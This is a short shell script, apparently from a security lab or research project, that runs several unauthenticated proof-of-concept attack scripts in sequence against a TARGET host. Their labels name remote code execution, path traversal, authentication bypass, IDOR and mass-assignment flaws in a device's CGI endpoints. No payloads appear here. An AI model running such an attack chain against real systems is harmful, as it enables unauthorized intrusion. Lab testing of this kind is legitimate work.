#!/bin/sh
# Run the unauthenticated network PoCs in sequence. LAB ONLY.
: "${TARGET:?set TARGET}"
export TARGET
echo "=========== M1 ping.cgi RCE ==========="; sh "$(dirname "$0")/01-ping-rce.sh"
echo "=========== M7 view.cgi traversal ==========="; sh "$(dirname "$0")/02-view-traversal.sh"
echo "=========== M6 admin.cgi bypass ==========="; sh "$(dirname "$0")/03-admin-bypass.sh"
echo "=========== M8 getcfg IDOR ==========="; sh "$(dirname "$0")/04-getcfg-idor.sh"
echo "=========== M9 api.cgi mass assign ==========="; sh "$(dirname "$0")/06-api-massassign.sh"
echo "=========== M17 remoteassist ==========="; sh "$(dirname "$0")/09-remoteassist-flag.sh"
echo "=========== M19 openvpn import RCE ==========="; sh "$(dirname "$0")/11-openvpn-import-rce.sh"
